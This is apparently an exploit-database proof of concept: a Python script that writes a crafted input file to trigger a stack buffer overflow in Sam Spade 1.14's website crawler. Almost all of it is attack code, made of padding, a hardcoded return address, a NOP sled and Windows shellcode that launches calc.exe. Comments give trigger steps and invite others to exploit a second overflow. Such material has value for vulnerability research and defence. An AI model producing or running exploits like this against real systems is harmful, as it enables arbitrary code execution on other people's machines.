# Exploit Title     : Sam Spade 1.14 - Buffer OverFlow
# Date              : 10/30/2015
# Exploit Author    : MandawCoder
# Contact           : MandawCoder@gmail.com
# Vendor Homepage   : http://samspade.org
# Software Link     : http://www.majorgeeks.com/files/details/sam_spade.html
# Version           : 1.14
# Tested on         : XP Professional SP3 En x86
# Category          : Local Exploit
# Description:
# bug is on this section == Tools -> Crawl website...
# Execute following exploit, then delete "http://" from "CRAWL all URLs below" part, then paste the content of file.txt into mentioned section.
#
# this section(and other sections as well) also has SEH buffer overflow ... I would really appreciated if someone Exploit it.


f = open("file.txt", "w")

Junk = "A"*503

addr = "\x53\x93\x42\x7E"

space = "AAAA"

nop="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

# Shellcode:
# windows/exec - 277 bytes
# CMD=calc.exe
shellcode= ("\xba\x1c\xb4\xa5\xac\xda\xda\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x33\x31\x53\x12\x83\xeb\xfc\x03\x4f\xba\x47\x59\x93\x2a\x0e"
"\xa2\x6b\xab\x71\x2a\x8e\x9a\xa3\x48\xdb\x8f\x73\x1a\x89\x23"
"\xff\x4e\x39\xb7\x8d\x46\x4e\x70\x3b\xb1\x61\x81\x8d\x7d\x2d"
"\x41\x8f\x01\x2f\x96\x6f\x3b\xe0\xeb\x6e\x7c\x1c\x03\x22\xd5"
"\x6b\xb6\xd3\x52\x29\x0b\xd5\xb4\x26\x33\xad\xb1\xf8\xc0\x07"
"\xbb\x28\x78\x13\xf3\xd0\xf2\x7b\x24\xe1\xd7\x9f\x18\xa8\x5c"
"\x6b\xea\x2b\xb5\xa5\x13\x1a\xf9\x6a\x2a\x93\xf4\x73\x6a\x13"
"\xe7\x01\x80\x60\x9a\x11\x53\x1b\x40\x97\x46\xbb\x03\x0f\xa3"
"\x3a\xc7\xd6\x20\x30\xac\x9d\x6f\x54\x33\x71\x04\x60\xb8\x74"
"\xcb\xe1\xfa\x52\xcf\xaa\x59\xfa\x56\x16\x0f\x03\x88\xfe\xf0"
"\xa1\xc2\xec\xe5\xd0\x88\x7a\xfb\x51\xb7\xc3\xfb\x69\xb8\x63"
"\x94\x58\x33\xec\xe3\x64\x96\x49\x1b\x2f\xbb\xfb\xb4\xf6\x29"
"\xbe\xd8\x08\x84\xfc\xe4\x8a\x2d\x7c\x13\x92\x47\x79\x5f\x14"
"\xbb\xf3\xf0\xf1\xbb\xa0\xf1\xd3\xdf\x27\x62\xbf\x31\xc2\x02"
 "\x5a\x4e")

f.write(Junk + addr + space + nop + shellcode)

f.close()

print "Done"
